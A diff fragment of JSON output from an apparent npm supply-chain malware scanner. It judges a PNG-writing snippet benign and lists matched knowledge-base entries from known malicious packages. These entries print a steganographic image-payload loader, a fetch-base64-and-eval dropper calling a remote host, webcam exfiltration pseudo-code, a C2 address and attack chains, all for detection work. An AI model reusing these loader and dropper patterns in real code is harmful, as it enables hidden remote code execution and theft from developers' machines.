+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "write-result-diff-image_slice_1",
+          "code_snippet": "const { PNG } = require('pngjs-nozlib');\nconst fs = require('fs');\nconst getStdin = require('get-stdin');\n\ngetStdin.buffer().then((buffer) => {\n  try {\n    const input = JSON.parse(buffer);\n    const { imagePath, image } = input;\n\n    image.data = Buffer.from(image.data);\n\n    const pngBuffer = PNG.sync.write(image);\n    fs.writeFileSync(imagePath, pngBuffer);\n    process.exit(0);\n  } catch (error) {\n    console.error(error); // eslint-disable-line no-console\n    process.exit(1);\n  }\n});",
+          "is_malicious": false,
+          "malice_score": 0.5569913784662882,
+          "confidence": 0.2,
+          "behavior_summary": "Upon receiving input from standard input, the code parses JSON data containing an image and a file path, converts the image data into a PNG buffer using the pngjs-nozlib library, and writes this buffer to the specified file path using synchronous file write operations. This involves reading and modifying file system data via fs.writeFileSync, enabling arbitrary file creation or overwriting based on external input, which could facilitate unauthorized file manipulation or code injection if exploited.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code reads JSON input from stdin, parses image data, converts it into a PNG buffer, and writes it to a specified file path. While it uses sensitive APIs like fs.writeFileSync with user-supplied file paths, this alone is not sufficient to classify it as malicious. Unlike the known malicious patterns, it does not perform dynamic code execution, steganographic payload extraction, remote code fetching, or eval-based execution. The code lacks obfuscation, network communication, or any attempt to execute arbitrary code. The main risk is potential misuse if deployed in an unsafe context, but this is a security concern rather than definitive malware behavior. Therefore, it is likely benign or utility code with some risk if misused, but not inherently malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_202033_905711_snippet_2",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5882916450500488,
+              "code_similarity": 0.5542924404144287,
+              "behavior_similarity": 0.622290849685669,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function processImage(filePath) {\n    console.log(\"Processing image...\");\n    const data = fs.readFileSync(filePath);\n    let analyzepixels = \"\";\n    let convertertree = false;\n\n    for (let i = 0; i < data.length; i++) {\n        const value = data[i];\n        if (value >= 32 && value <= 126) {\n            analyzepixels += String.fromCharCode(value);\n        } else {\n            if (analyzepixels.length > 2000) {\n                convertertree = true;\n                break;\n            }\n            analyzepixels = \"\";\n        }\n    }\n    // ...\n    if (convertertree) {\n        imagebyte = analyzepixels;\n    } else {\n        // benign code\n    }\n    const func = new Function('https', 'exec', 'os', imagebyte);\n    func(https, exec, os);\n}\nprocessImage('logo1.jpg');\nprocessImage('logo2.jpg');\nprocessImage('logo3.jpg');",
+                "code_behavior": "During postinstall, the code reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads from their byte data, and if a threshold is met, dynamically executes the extracted string as JavaScript code, resulting in arbitrary code execution sourced from image-embedded payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files.",
+                  "violated_expectations": "Legitimate packages do not extract and execute code from image files during installation, nor do they use dynamic code execution on data sourced from non-code files.",
+                  "similar_legitimate_use": "Legitimate image processing libraries may read and analyze image files, but never execute dynamically extracted code from image data.",
+                  "key_indicators": [
+                    "Steganographic payload extraction from image files",
+                    "Dynamic code execution using new Function() on extracted strings",
+                    "Threshold-based trigger for code execution (payload length > 2000)",
+                    "References to analyzepixels, convertertree, and imagebyte variables"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "dist/loadformat.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205357_346502_snippet_2",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205357_346502/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5586998462677002,
+              "code_similarity": 0.4158511757850647,
+              "behavior_similarity": 0.7015485763549805,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const filePath = req.body.path;\nfs.readFile(filePath, ...);",
+                "code_behavior": "At runtime, the code reads a file path directly from the user-supplied req.body.path and uses it in a filesystem read operation, allowing an attacker to supply arbitrary paths. When combined with prototype pollution, this can be exploited to manipulate application logic, potentially leading to remote code execution or denial-of-service.",
+                "malice_analysis": {
+                  "why_suspicious": "Directly using user-supplied file paths in filesystem operations without validation is dangerous, especially when prototype pollution can alter the behavior of path resolution or introduce malicious properties.",
+                  "violated_expectations": "Secure applications should validate and restrict file paths from user input to prevent unauthorized file access. Here, the path is used without any checks, increasing the risk of exploitation, especially in the presence of prototype pollution.",
+                  "similar_legitimate_use": "Reading files based on user input is common in file upload handlers, but should always be restricted to safe directories and validated to prevent path traversal or injection attacks.",
+                  "key_indicators": [
+                    "Direct use of req.body.path or similar user input in fs.readFile or other filesystem APIs",
+                    "No validation or sanitization of file paths before use",
+                    "Potential for prototype pollution to alter file path resolution logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling file path operations after upload)",
+                  "file_location": "function parsing file path information (e.g., path parsing utility within the package)",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "<1.1.10",
+                  "why_malicious": "The package contains a prototype pollution vulnerability in versions prior to 1.1.10, allowing attackers to manipulate JavaScript object prototypes by submitting specially crafted file upload requests. This can result in arbitrary property injection, remote code execution, or denial-of-service, posing a critical security risk in affected deployments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker submits a file upload request with a specially crafted key such as '__proto__' in the request body, targeting the file upload handler.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prototype pollution of global objects, allowing attacker-controlled properties to be injected into the application's object prototype chain."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The polluted prototype alters application logic, such as file path parsing or other sensitive operations, by introducing malicious properties or behaviors.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Potential remote code execution or denial-of-service through manipulation of file system operations or other critical application logic."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Assignment of user-supplied keys from req.body to application objects (e.g., req.files) without key validation or sanitization",
+                    "Presence of special keys such as '__proto__', 'constructor', or 'prototype' in HTTP request bodies during file uploads",
+                    "Unexpected or anomalous properties appearing on global objects or prototypes at runtime, especially after file upload requests"
+                  ],
+                  "file_indicators": [
+                    "Unvalidated use of req.body or similar user input in file upload handler code (e.g., for-in loops over req.body)",
+                    "Direct assignment of user input to sensitive objects (e.g., req.files) without filtering",
+                    "Use of fs.readFile or similar filesystem APIs with user-supplied paths from req.body"
+                  ],
+                  "network_indicators": [
+                    "HTTP file upload requests containing keys such as '__proto__', 'constructor', or 'prototype' in the request body",
+                    "Malformed or suspicious multipart/form-data requests with prototype pollution payloads targeting file upload endpoints"
+                  ],
+                  "how_to_detect": "Monitor HTTP file upload requests for suspicious keys like '__proto__', 'constructor', or 'prototype' in the request body. Use static analysis to identify for-in loops or object assignments that copy user input without key filtering in file upload handlers. Employ dynamic analysis to detect unexpected prototype properties or anomalous behavior in global objects at runtime after file uploads. Audit code for direct use of user-supplied file paths in filesystem operations without validation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102920_388185_snippet_1",
+              "source_package": "cors-parser (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102920_388185/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5303930044174194,
+              "code_similarity": 0.4732971787452698,
+              "behavior_similarity": 0.5874888896942139,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const t = \"base64\",\n    c = \"utf8\",\n    ht = require(\"https\"),\n    cors = () => {\n        const request = ht[\"get\"](\"hxxps://api.jz-aws[.]info/initial.png\"), (function(response) {\n            let data = \"\";\n            response.on(data), (r => {\n                data += r\n            })), response.on(data, (() => {\n                let plain = Buffer.from(data, t).toString();\n                eval(plain)\n            }))\n        }))\n    };\nmodule.exports = cors;",
+                "code_behavior": "At import-time, the code initiates an HTTPS GET request to a remote server to download a file named 'initial.png', accumulates the response data, decodes the base64-encoded content, and executes it using eval, resulting in remote code execution and enabling the delivery of a second-stage payload.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically fetches and executes remote content at import-time, using eval on data received from an untrusted external domain. This is a classic remote code execution pattern and is highly indicative of malware staging.",
+                  "violated_expectations": "A legitimate CORS parser should not perform any network requests or execute remote code during import. Such behavior is entirely outside the expected functionality of a CORS utility.",
+                  "similar_legitimate_use": "Dynamic plugin systems may fetch and execute code, but only from trusted, verifiable sources and with explicit user consent, never at import-time without user interaction.",
+                  "key_indicators": [
+                    "Import-time network request to untrusted external domain",
+                    "Base64 decoding and dynamic execution of remote content using eval",
+                    "No user interaction or consent required for code execution",
+                    "Obfuscated or minified code structure in index.js"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cors-parser",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 to 3.0.1",
+                  "why_malicious": "The package is explicitly designed to act as a dropper for multi-stage malware. Upon import, it downloads and executes remote code disguised as PNG images, which are actually platform-specific backdoors. It uses steganography and code execution techniques to implant persistent malware on both Windows and Unix systems, violating user trust, enabling remote access, and compromising system security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package import triggers a network request to download and execute remote code from 'initial.png' using eval.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Stage 2 payload execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Stage 2 payload downloads and executes platform-specific backdoor binaries disguised as PNG files, targeting Windows and Unix systems.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Persistence and remote access established"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence mechanisms are established via registry autorun modification on Windows or shell profile (.zshrc) modification on Unix.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Backdoor remains active across system reboots"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Import-time network requests to untrusted domains",
+                    "Base64 decoding and eval execution of remote content",
+                    "Downloading and executing files with image extensions as binaries",
+                    "Persistence via registry autorun or shell profile modification",
+                    "Writing executables to uncommon locations such as /var/tmp or C:/ProgramData with misleading file extensions"
+                  ],
+                  "file_indicators": [
+                    "index.js containing minified or obfuscated network/eval logic",
+                    "Downloaded files named *.png but containing binary or script content",
+                    "/var/tmp/logd (Unix backdoor binary)",
+                    "C:/ProgramData/thumbs.db (Windows DLL backdoor)",
+                    "Modifications to .zshrc (Unix) or registry autorun keys (Windows)"
+                  ],
+                  "network_indicators": [
+                    "api.jz-aws.info (all subdomains and paths)",
+                    "HTTPS requests for .png files from api.jz-aws.info or similar non-image hosting domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests at import or install time, especially to suspicious domains like api.jz-aws.info. Flag code that decodes and executes remote content using eval. Detect files with image extensions being written and executed as binaries, particularly in uncommon locations such as /var/tmp or C:/ProgramData. Watch for unauthorized modifications to autorun registry keys or shell profile files (.zshrc, .bashrc). Network monitoring should alert on requests to api.jz-aws.info or similar suspicious infrastructure, especially for .png files that are not valid images."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113708_595271_snippet_2",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113708_595271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5302287340164185,
+              "code_similarity": 0.49333155155181885,
+              "behavior_similarity": 0.5671259164810181,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Example pseudo-code\nconst screenshot = require('screenshot-desktop');\nscreenshot().then((img) => {\n  // send img to remote server\n});\n\nconst NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // send data to remote server\n});",
+                "code_behavior": "At runtime, the code captures screenshots and webcam images using system APIs or npm modules, then exfiltrates the captured media to a remote server via network requests, resulting in unauthorized surveillance.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the screen and camera without user consent and sending the data externally is a hallmark of spyware and privacy violation.",
+                  "violated_expectations": "Normal npm packages should not access or exfiltrate screen or camera data unless explicitly designed for such purposes with user awareness and consent.",
+                  "similar_legitimate_use": "Video conferencing or screenshot tools may access these resources, but only with user consent and without silent exfiltration to unknown servers.",
+                  "key_indicators": [
+                    "Use of screenshot-desktop or node-webcam modules for image capture",
+                    "Silent capture of screenshots or webcam images without user notification",
+                    "Network exfiltration of image data to remote servers",
+                    "Absence of user prompts or consent dialogs for camera/screen access"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main JavaScript file or auxiliary modules",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "camera",
+                    "screen",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is considered malicious because it abuses a legitimate password-recovery tool (ChromePass) to steal credentials from Google Chrome, and provides additional capabilities such as unauthorized screen and camera access, directory enumeration, and remote shell command execution. These behaviors are not expected in legitimate npm packages and indicate clear intent to exfiltrate sensitive user data and enable remote control of the victim's system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed on the victim's system.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code at runtime"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At runtime, the package executes ChromePass.exe to extract Chrome passwords and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package captures screenshots and webcam images, then exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and privacy violation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package lists directories on the victim's filesystem and sends the information to a remote server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reconnaissance for further exploitation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "The package enables remote shell command execution, allowing attackers to control the victim's system and maintain persistence.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full remote compromise and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or similar credential extraction tools from within npm packages",
+                    "Silent screenshot or webcam capture using screenshot-desktop or node-webcam modules followed by network exfiltration",
+                    "Automated directory listing of user or system directories and exfiltration of file lists",
+                    "Remote command execution via child_process.exec or similar APIs, especially when commands originate from network sources"
+                  ],
+                  "file_indicators": [
+                    "Bundled or downloaded ChromePass.exe binary within the package directory",
+                    "Creation of temporary files such as passwords.txt in user-accessible directories",
+                    "Unusual or unauthorized use of screenshot-desktop or node-webcam modules in non-UI npm packages"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known command-and-control or exfiltration domains immediately after package installation or execution",
+                    "HTTP POST requests containing credential dumps, screenshots, webcam images, or directory listings",
+                    "Unusual network traffic patterns from node.js processes, especially following execution of external binaries or system commands"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that execute external binaries such as ChromePass.exe, access camera or screen APIs, or perform directory listing and exfiltration. Flag packages that initiate outbound network connections immediately after installation or at runtime, especially those sending sensitive files, images, or command outputs. Use endpoint security tools to detect suspicious process execution and network activity originating from node.js processes, and correlate with the presence of bundled binaries or unauthorized use of system resources."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171940_736614_snippet_3",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171940_736614/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5269765853881836,
+              "code_similarity": 0.4683196544647217,
+              "behavior_similarity": 0.5856335759162903,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // exfiltrate data\n});",
+                "code_behavior": "At runtime, the code activates the user's webcam using node-webcam, captures an image, and exfiltrates the photo data to a remote server, resulting in a privacy violation.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the webcam and sending images externally without user consent is a hallmark of spyware and a severe privacy violation.",
+                  "violated_expectations": "Legitimate npm packages should not access the webcam or exfiltrate images without explicit user consent and notification.",
+                  "similar_legitimate_use": "Video conferencing or camera applications may access the webcam, but only with user permission and clear indication.",
+                  "key_indicators": [
+                    "Use of node-webcam or similar webcam access modules",
+                    "Automated webcam activation and image capture",
+                    "Network exfiltration of webcam images or video data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main application file or a helper module",
+                  "required_permissions": [
+                    "camera",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is malicious because it abuses ChromePass, a legitimate password-recovery tool for Google Chrome, to steal user credentials. It also provides advanced surveillance and system compromise capabilities, including unauthorized access to the user's screen, webcam, filesystem, and shell, with automated exfiltration of sensitive data to remote servers. These behaviors are highly indicative of malware and pose significant privacy and security risks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or runs the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code executes at runtime."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malware executes ChromePass to extract Chrome passwords and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware captures screenshots and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and data theft."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware activates webcam, captures images, and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Surveillance and privacy violation."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malware lists user directories and exfiltrates directory listings.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Reconnaissance for further attacks."
+                  },
+                  {
+                    "step": 6,
+                    "action": "Malware executes arbitrary shell commands and exfiltrates the results.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Full system compromise and persistent access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or other credential extraction tools from within npm package code",
+                    "Unusual access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop) without user interaction",
+                    "Automated directory listing of user or system folders followed by network exfiltration",
+                    "Remote shell command execution via child_process.exec or similar APIs with exfiltration of outputs"
+                  ],
+                  "file_indicators": [
+                    "Presence of ChromePass.exe bundled or downloaded in the package directory",
+                    "Creation of temporary files such as passwords.txt or screenshot images in user directories",
+                    "Unexpected image files (e.g., test_picture.jpg) or directory listings in temporary or user folders"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to unknown or suspicious remote servers immediately after credential, image, or directory data is generated",
+                    "Exfiltration of credential files (e.g., passwords.txt), screenshots, webcam images, or command outputs via HTTP, HTTPS, or other protocols"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of external tools like ChromePass.exe, access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop), and unexpected network activity following sensitive data access. Flag packages that attempt to exfiltrate files, images, or command outputs. Scan for bundled binaries such as ChromePass.exe and temporary files like passwords.txt or screenshot images in user directories. Use endpoint protection to detect suspicious child_process executions, automated directory listings, and network exfiltration attempts. Correlate behavioral, file, and network indicators to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
